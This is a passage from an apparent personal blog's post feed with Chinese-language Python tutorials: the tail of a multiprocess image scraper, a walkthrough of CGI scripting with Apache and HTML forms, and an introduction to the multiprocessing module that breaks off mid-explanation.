class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        papeid = pagequeue.get()</span><br><span class="line">        response = http.get(<span class="string">'http://www.doutula.com/photo/list/?page=&#123;&#125;'</span>.format(papeid), headers=headers,timeout=<span class="number">2</span>)</span><br><span class="line">        get_imglist(response.text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#判断当前位置是唯一的连接</span></span><br><span class="line">    http = requests.Session()</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        name, url = picqueue.get()</span><br><span class="line">        <span class="comment">#判断是否已经下载该图片</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isfile(os.path.join(BASE_DIR, name)):</span><br><span class="line">            <span class="comment"># req = http.get(url)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> open(os.path.join(BASE_DIR,name),<span class="string">'wb+'</span>) <span class="keyword">as</span> f:</span><br><span class="line">                    f.write(http.get(url).content)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                error.append([name,url])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(BASE_DIR):</span><br><span class="line">        os.mkdir(BASE_DIR)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#将页码放入队列中</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1656</span>):</span><br><span class="line">        <span class="comment"># print(type(i))</span></span><br><span class="line">        pagequeue.put(i)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动页面任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        pagepool.apply_async(get_page)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动图片任务池</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        picpool.apply_async(save_file)</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        print(logqueue.get())</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
<p>本文是对python实现并发的学习总结，具体有python进程并发编程的几种方式以及它们之间的关联与区别，通过实例来体现与利用，最后的实例加上了爬虫的内容，这是再学习安全之余对于编程的学习，安全最后还是离不开代码，相辅相成。</p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>线程池</tag>
        <tag>进程池</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>python CGI编程</title>
    <url>/2018/06/17/python-CGI%E7%BC%96%E7%A8%8B%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h2 id="python-CGI编程"><a href="#python-CGI编程" class="headerlink" title="python CGI编程"></a>python CGI编程</h2><p>###什么是CGI</p>
<blockquote>
<p>CGI(Commom Gateway Interface)通用网关接口，它是一段程序，运行在服务器。如HTTP服务器，提供同客户端HTML页面的接口。</p>
</blockquote>
<h3 id="网页浏览"><a href="#网页浏览" class="headerlink" title="网页浏览"></a>网页浏览</h3><blockquote>
<p>通过在网页上点击一个链接或URL的流程了解CGI是如何工作的</p>
</blockquote>
<ol>
<li>使用浏览器访问URL连接到HTTP web 服务器</li>
<li>web 服务器接收到请求以后解析URL，并查找访问文件是否在HTTP服务器上存在，如果存在返回内容，不存在返回错误信息</li>
<li>CGI程序可以是python脚本，Perl脚本，shell脚本，C或C++程序等</li>
</ol>
<h3 id="CGI架构图及其本地环境配置"><a href="#CGI架构图及其本地环境配置" class="headerlink" title="CGI架构图及其本地环境配置"></a>CGI架构图及其本地环境配置</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529201542.26.png" alt></p>
<ul>
<li><p>采用PHPstudy+windows测试，修改httpd.conf配置文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 查找一下自己的DocumentRoot </span><br><span class="line">DocumentRoot  &quot;E:\Environment\phpstudy\PHPTutorial\WWW&quot;</span><br><span class="line"></span><br><span class="line">&lt;Directory /&gt;</span><br><span class="line">    AllowOverride All</span><br><span class="line">    Options +ExecCGI</span><br><span class="line">    Order allow,deny  </span><br><span class="line">    Allow from all  </span><br><span class="line">    #Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line">#让apache识别py文件为cgi程序：</span><br><span class="line">AddHandler cgi-script .cgi .py </span><br><span class="line"></span><br><span class="line">只允许在特别目录下执行cgi程序:</span><br><span class="line">ScriptAlias /cgi-bin/ &quot;D:/Program/phpStudy/Apache/cgi-bin/&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>测试实例（python不用指定编码，测试了时候指定编码出现乱码）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!D:/python36/python.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Content-type:text/html"</span>)</span><br><span class="line"><span class="keyword">print</span> ()                             <span class="comment"># 空行，告诉服务器结束头部</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;html&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;head&gt;'</span>)</span><br><span class="line"><span class="comment"># print ('&lt;meta charset="UTF-8"&gt;')</span></span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;title&gt;Hello Word 你好123！&lt;/title&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;/head&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;body&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;h2&gt; Hello Word! 菜鸟123&lt;/h2&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;/body&gt;'</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">'&lt;/html&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#作为http协议的要求，一定要输出http headers</span></span><br><span class="line"><span class="comment">#在存在http headers的前提下，一定要在headers后面打印一个空行，否则服务器会报错</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529204892.39.png" alt></p>
</li>
</ul>
<h3 id="CGI-HTTP头部及CGI环境变量"><a href="#CGI-HTTP头部及CGI环境变量" class="headerlink" title="CGI HTTP头部及CGI环境变量"></a>CGI HTTP头部及CGI环境变量</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529205175.71.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529205233.0.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529205252.14.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529205271.41.png" alt></p>
<h3 id="CGI实例"><a href="#CGI实例" class="headerlink" title="CGI实例"></a>CGI实例</h3><ol>
<li><p>通过CGI输出CGI环境变量</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!D:/python36/python.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">print(<span class="string">"Content-type: text/html"</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"&lt;b&gt;环境变量&lt;/b&gt;&lt;br&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;ul&gt;"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> os.environ.keys():</span><br><span class="line">    print(<span class="string">"&lt;li&gt;&lt;span style='color:green'&gt;%30s&lt;/span&gt; : %s&lt;/li&gt;"</span> % (i,os.environ[i]))</span><br><span class="line">print(<span class="string">"&lt;/ul&gt;"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529205971.94.png" alt></p>
</li>
<li><p>通过CGI实现GET传递信息（也可以通过构造表单的方法实现GET信息传递，默认情况下只存放脚本文件）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!D:/python36/python.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cgi, cgitb</span><br><span class="line"></span><br><span class="line"><span class="comment">#创建filedstorage的实例、</span></span><br><span class="line">form = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="comment">#获取数据</span></span><br><span class="line">s_name = form.getvalue(<span class="string">'name'</span>)</span><br><span class="line">s_url = form.getvalue(<span class="string">'url'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"Content-type:text/html"</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"&lt;html&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;head&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;title&gt;测试&lt;/title&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;/head&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;body&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;h2&gt;%s博客：%s&lt;/h2&gt;"</span> % (s_name,s_url))</span><br><span class="line">print(<span class="string">"&lt;/body&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;/html&gt;"</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529208739.64.png" alt></p>
</li>
<li><p>通过CGI用POST传递数据（使用上面的GET脚本结合表单来POST传递）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"get1.py"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">站点名称: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"name"</span>&gt;</span>  <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">站点 URL: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"url"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529209260.07.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529209306.54.png" alt></p>
</li>
<li><p>通过CGI程序来传递CheckBox数据（需要一个表单和CGI处理的脚本文件）</p>
<ul>
<li><p>cgi脚本文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!D:/python36/python.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cgi, cgitb</span><br><span class="line"></span><br><span class="line">form = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="comment">#接收字段数据</span></span><br><span class="line"><span class="keyword">if</span> form.getvalue(<span class="string">'google'</span>):</span><br><span class="line">    google_flag = <span class="string">"是"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    google_flag = <span class="string">"否"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> form.getvalue(<span class="string">'lsowl'</span>):</span><br><span class="line">    lsowl_flag = <span class="string">"是"</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    lsowl_flag = <span class="string">"否"</span></span><br><span class="line">print(<span class="string">"Content-type:text/html"</span>)</span><br><span class="line">print()</span><br><span class="line">print(<span class="string">"&lt;html&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;head&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;title&gt;测试&lt;/title&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;/head&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;body&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;h2&gt;lsowl是否选择了 : %s&lt;/h2&gt;"</span> % lsowl_flag)</span><br><span class="line">print(<span class="string">"&lt;h2&gt;google是否选择了 : %s&lt;/h2&gt;"</span> % google_flag)</span><br><span class="line">print(<span class="string">"&lt;/body&gt;"</span>)</span><br><span class="line">print(<span class="string">"&lt;/html&gt;"</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>传递数据的表单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"checkbox.py"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"lsowl"</span> <span class="attr">value</span>=<span class="string">"on"</span> /&gt;</span> lsowl</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"checkbox"</span> <span class="attr">name</span>=<span class="string">"google"</span><span class="attr">value</span>=<span class="string">"on"</span> /&gt;</span> google</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"选择站点"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529211130.67.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529211139.71.png" alt></p>
</li>
</ul>
</li>
<li><p>通过CGI传递Radio数据（只向服务器传输一个数据）</p>
<ul>
<li><p>传递Radio数据的CGI脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!D:/python36/python.exe</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cgi, cgitb</span><br><span class="line"></span><br><span class="line">form = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> form.getvalue(<span class="string">'site'</span>):</span><br><span class="line">    site = form.getvalue(<span class="string">'site'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    site = <span class="string">'提交的数据为空'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (<span class="string">"Content-type:text/html"</span>)</span><br><span class="line"><span class="keyword">print</span> ()</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;html&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;head&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;title&gt;测试&lt;/title&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;/head&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;body&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;h2&gt; 选中的网站是 %s&lt;/h2&gt;"</span> % site)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;/body&gt;"</span>)</span><br><span class="line"><span class="keyword">print</span> (<span class="string">"&lt;/html&gt;"</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>传递Radio数据的CGI表单</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>菜鸟教程(runoob.com)<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"radion.py"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"site"</span> <span class="attr">value</span>=<span class="string">"lsowl"</span> /&gt;</span> lsowl</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"radio"</span> <span class="attr">name</span>=<span class="string">"site"</span> <span class="attr">value</span>=<span class="string">"google"</span> /&gt;</span> Google</span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529211658.49.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529211669.84.png" alt></p>
</li>
</ul>
</li>
<li><p>通过CGI程序传递 Textarea 数据、下拉数据等、设置cookie、上传下载文件，这些只需要改一些HTML方法就可以实现，和上面的本质上没有什么区别</p>
</li>
</ol>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
<p>本文是对python的CGI编程的一个学习，学习了CGI及python CGI编程的特性，通过CGI结合前端实现许多功能，由于后面上传下载文件这些只是修改一些方法和HTML元素，本质上差别不大，就没有写完了，可以参考链接</p>
<p>tp://<a href="http://www.runoob.com/python3/python3-cgi-programming.html" target="_blank" rel="noopener">www.runoob.com/python3/python3-cgi-programming.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>CGI编程</tag>
      </tags>
  </entry>
  <entry>
    <title>python多进程</title>
    <url>/2018/06/16/python%E5%A4%9A%E8%BF%9B%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="python多进程"><a href="#python多进程" class="headerlink" title="python多进程"></a>python多进程</h2><blockquote>
<p>python跨平台实现多进程需要使用multiprocessing这个模块，在模块中常用的两个类是process和pool</p>
</blockquote>
<h2 id="process类"><a href="#process类" class="headerlink" title="process类"></a>process类</h2><blockquote>
<p>process类用来描述一个进程对象。创建子进程的时候只需要传入一个执行函数和函数的参数就可以完成process实例的创建。</p>
</blockquote>
<ul>
<li><p>start() 方法启动进程</p>
</li>
<li><p>join()  方法实现进程之间的同步，等待所有进程退出</p>
</li>
<li><p>close()方法阻止多余的进程涌入进程池pool造成进程阻塞</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> __init__(self, group=<span class="keyword">None</span>, target=<span class="keyword">None</span>, name=<span class="keyword">None</span>, args=(), kwargs=&#123;&#125;, *,mon=<span class="keyword">None</span>)</span><br><span class="line">|      初始化类，target指向函数名，name参数可以为该进程设置名称，args是为target指向的函数传入的参数，且为tuple类型的</span><br><span class="line">|</span><br><span class="line">|  is_alive(self)</span><br><span class="line">|      返回这个进程是否alive</span><br><span class="line">|</span><br><span class="line">|  join(self, timeout=<span class="keyword">None</span>)</span><br><span class="line">|      等待，直到子进程执行完毕</span><br><span class="line">|</span><br><span class="line">|  run(self)</span><br><span class="line">|      Method to be run <span class="keyword">in</span> sub-process; can be overridden <span class="keyword">in</span> sub-<span class="class"><span class="keyword">class</span></span></span><br><span class="line"><span class="class">|</span></span><br><span class="line"><span class="class">|  <span class="title">start</span><span class="params">(self)</span></span></span><br><span class="line"><span class="class">|      开启子进程</span></span><br><span class="line"><span class="class">|</span></span><br><span class="line"><span class="class">|  <span class="title">terminate</span><span class="params">(self)</span></span></span><br><span class="line"><span class="class">|      结束进程</span></span><br><span class="line"><span class="class">|  ----------------------------------------------------------------------</span></span><br><span class="line"><span class="class">|  <span class="title">Data</span> <span class="title">descriptors</span> <span class="title">inherited</span> <span class="title">from</span> <span class="title">multiprocessing</span>.<span class="title">process</span>.<span class="title">BaseProcess</span>:</span></span><br><span class="line">|</span><br><span class="line">|  __dict__</span><br><span class="line">|      dictionary <span class="keyword">for</span> instance variables (<span class="keyword">if</span> defined)</span><br><span class="line">|</span><br><span class="line">|  __weakref__</span><br><span class="line">|      list of weak references to the object (<span class="keyword">if</span> defined)</span><br><span class="line">|</span><br><span class="line">|  authkey</span><br><span class="line">|</span><br><span class="line">|  daemon</span><br><span class="line">|      返回该进程是否为守护进程</span><br><span class="line">|</span><br><span class="line">|  exitcode</span><br><span class="line">|      返回进程的退出代码</span><br><span class="line">|</span><br><span class="line">|  ident</span><br><span class="line">|      Return identifier (PID) of process <span class="keyword">or</span> `<span class="keyword">None</span>` <span class="keyword">if</span> it has yet to start</span><br><span class="line">|</span><br><span class="line">|  name</span><br><span class="line">|</span><br><span class="line">|  pid</span><br><span class="line">|      Return identifier (PID) of process <span class="keyword">or</span> `<span class="keyword">None</span>` <span class="keyword">if</span> it has yet to start</span><br></pre></td></tr></table></figure>
</li>
<li><p>process类使用实例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing,os</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_proc</span><span class="params">(name)</span>:</span></span><br><span class="line">    print(<span class="string">'Child process &#123;0&#125; &#123;1&#125; Running'</span>.format(name,os.getpid()))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'Parent process &#123;0&#125; is Running'</span>.format(os.getpid()))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        p = multiprocessing.Process(target=run_proc,args=(str(i),))</span><br><span class="line">        print(<span class="string">'process start'</span>)</span><br><span class="line">        p.start()</span><br><span class="line">    p.join()</span><br><span class="line">    print(<span class="string">'process close'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#这里创建多个进程可以使用for循环，也可以使用进程池，在使用for循环的时候注意join方法在for循环之外</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="Pool类"><a href="#Pool类" class="headerlink" title="Pool类"></a>Pool类</h2><ul>
<li><p>Pool类可以提供指定数量的进程供用户使用，默认是CPU核数。当有新的请求提交到Pool的时候，如果进程池没有满，则会创建一个进程执行，如果进程池满了，则会让该请求等待。</p>
</li>
<li><p>Pool对象调用join方法会等待所有的子进程执行完毕</p>
</li>
<li><p>调用join方法前必须调用close()</p>
</li>
<li><p>调用close()以后就不能继续添加新的Process</p>
</li>
<li><p>pool.apply_async() 直接启动了进程，不用使用start来启动（同步执行进程，允许多个进程同时进入进程池）</p>
</li>
<li><p>pool类使用实例（使用apply_async()来执行进程）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_task</span><span class="params">(name)</span>:</span></span><br><span class="line">    print(<span class="string">'Task &#123;0&#125; pid &#123;1&#125; is Running, Parent id is &#123;2&#125;'</span>.format(name,os.getpid(),os.getppid()))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'Task &#123;0&#125; end'</span>.format(name))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'current process &#123;0&#125;'</span>.format(os.getpid()))</span><br><span class="line">    p = multiprocessing.Pool(processes=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        p.apply_async(run_task,args=(i,))</span><br><span class="line">    print(<span class="string">'Waiting for all subprocesses done...'</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    print(<span class="string">'All process done!'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529156949.15.png" alt></p>
</li>
<li><p>pool使用实例（pool.apply(func[,args[，kwds]]) 只允许一个进程进入进程池，在一个进程结束以后，另外一个进程才可以进入执行）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_task</span><span class="params">(name)</span>:</span></span><br><span class="line">    print(<span class="string">'Task &#123;0&#125; pid &#123;1&#125; is running, parent id is &#123;2&#125;'</span>.format(name, os.getpid(), os.getppid()))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'Task &#123;0&#125; end.'</span>.format(name))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">'current process &#123;0&#125;'</span>.format(os.getpid()))</span><br><span class="line">    p = multiprocessing.Pool(processes=<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">6</span>):</span><br><span class="line">        p.apply(run_task,args=(i,))</span><br><span class="line">    print(<span class="string">'Waiting for all subprocesses done...'</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    p.join()</span><br><span class="line">    print(<span class="string">'All process done!'</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529156984.47.png" alt></p>
</li>
</ul>
<h2 id="进程间的通信"><a href="#进程间的通信" class="headerlink" title="进程间的通信"></a>进程间的通信</h2><ol>
<li><p>使用python标准库中的subprocess包来fork一个子进程，并运行一个外部的程序</p>
<ul>
<li><p>subprocess.call(command,shell=True) fork一个子进程，并运行一个外部程序(命令)在本进程中显示结果</p>
</li>
<li><p>subprocess.check_output(command)   将外部命令执行结果放入变量，不在控制台输出</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529158361.89.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1529158413.44.png" alt></p>
</li>
<li><p>可以看出subprocess.call和check_output的返回结果，call执行成功返回一个0，否则返回非零数，check_output返回命令执行的结果</p>
</li>
</ul>
</li>
<li><p>multiprocessing提供的Queue（Queue用来在多个进程间的通信，Queue有两个方法，get和put）</p>
<ul>
<li><p>put方法用来插入数据到队列中。有两个可选参数，blocked和timeout</p>
<ul>
<li>blocked = True（默认值），timeout 为正</li>
</ul>
<blockquote>
<p>该方法会阻塞 timeout 指定的时间，直到该队列有剩余空间。如果超时，抛出 Queue.Full 异常</p>
</blockquote>
<ul>
<li>blocked = False </li>
</ul>
<blockquote>
<p>如果 Queue 已满，<code>立刻</code>抛出 Queue.Full 异常</p>
</blockquote>
</li>
<li><p>get方法用来从队列中读取并删除一个元素。有两个参数可选，blocked 和 timeout</p>
<ul>
<li>blocked = False （默认），timeout 正值</li>
</ul>
<blockquote>
<p>等待时间内，没有取到任何元素，会抛出 Queue.Empty 异常</p>
</blockquote>
